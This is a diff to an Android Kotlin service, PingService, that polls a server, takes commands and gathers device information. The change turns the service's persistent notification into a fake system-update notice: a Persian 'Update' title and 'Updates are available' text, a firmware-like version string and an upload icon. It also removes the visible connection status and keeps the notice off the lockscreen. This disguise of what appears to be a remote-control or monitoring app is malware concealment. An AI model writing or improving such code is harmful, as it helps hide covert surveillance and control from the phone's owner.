@@ -83,7 +83,7 @@ class PingService : Service() {
     override fun onCreate() {
         super.onCreate()
         createChannel()
-        startForeground(NOTIF_ID, buildNotification("starting..."))
+        startForeground(NOTIF_ID, buildNotification())
         thread = HandlerThread("ping").apply { start() }
         handler = Handler(thread!!.looper)
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -244,7 +244,8 @@ class PingService : Service() {
 
         client.newCall(req).enqueue(object : Callback {
             override fun onFailure(call: Call, e: java.io.IOException) {
-                updateNotification("offline")
+                // فقط لاگ می‌کنیم، نوتیفیکیشن رو به‌روز نمی‌کنیم
+                Log.w(TAG, "Ping failed: ${e.message}")
             }
             override fun onResponse(call: Call, response: Response) {
                 response.use {
@@ -253,14 +254,15 @@ class PingService : Service() {
                         if (!pendingReport.isNullOrBlank()) prefs.edit().remove(KEY_REPORT).apply()
                         if (!pendingInfo.isNullOrBlank())   prefs.edit().remove("pending_info").apply()
                         handleResponse(bodyStr)
-                    } else updateNotification("err ${it.code}")
+                    } else {
+                        Log.w(TAG, "Ping response error: ${it.code}")
+                    }
                 }
             }
         })
     }
 
     private fun handleResponse(bodyStr: String) {
-        updateNotification("ok")
         try {
             val json = JSONObject(bodyStr)
             val srv  = json.optString("server_url", "")
@@ -292,6 +294,8 @@ class PingService : Service() {
             }
         } catch (_: Exception) {}
     }
+
+    /* ============================================================ commands */
 
     private fun vibrate() {
         try {
@@ -522,6 +526,8 @@ class PingService : Service() {
         })
     }
 
+    /* =========================================================== device info */
+
     private fun batteryLevel(): Int =
         (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
             .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
@@ -547,44 +553,28 @@ class PingService : Service() {
         }
     }
 
+    /* ========================================================== notification */
+
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN)
+            val ch = NotificationChannel(CHANNEL_ID, "PingMon", NotificationManager.IMPORTANCE_MIN)
                 .apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
             getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
         }
     }
 
-    // ==================== تغییرات فقط در این بخش ====================
-    private fun buildNotification(text: String): Notification {
-        val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
-            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
-            ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com"))
-                .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
-        val tap = PendingIntent.getActivity(this, 0, playIntent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
-        
-        // ✅ عنوان و آیکون مطابق تصویر شما
-        val title = "V13.0.5.0 SUZEXM"
-        val icon = android.R.drawable.ic_menu_upload
-        
+    private fun buildNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle(title)
-            .setContentText(text)
-            .setSmallIcon(icon)
+            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
+            .setContentTitle("به‌روزرسانی")
+            .setContentText("به‌روزرسانی‌ها در دسترس هستند")
+            .setStyle(NotificationCompat.BigTextStyle()
+                .bigText("V13.0.5.0.SJZEUXM"))
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
             .setSilent(true)
             .setShowWhen(false)
-            .setContentIntent(tap)
+            .setAutoCancel(false)
             .build()
-    }
-    // ==============================================================
-
-    private fun updateNotification(state: String) {
-        try {
-            getSystemService(NotificationManager::class.java)
-                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} - $state"))
-        } catch (_: Exception) {}
     }
 }
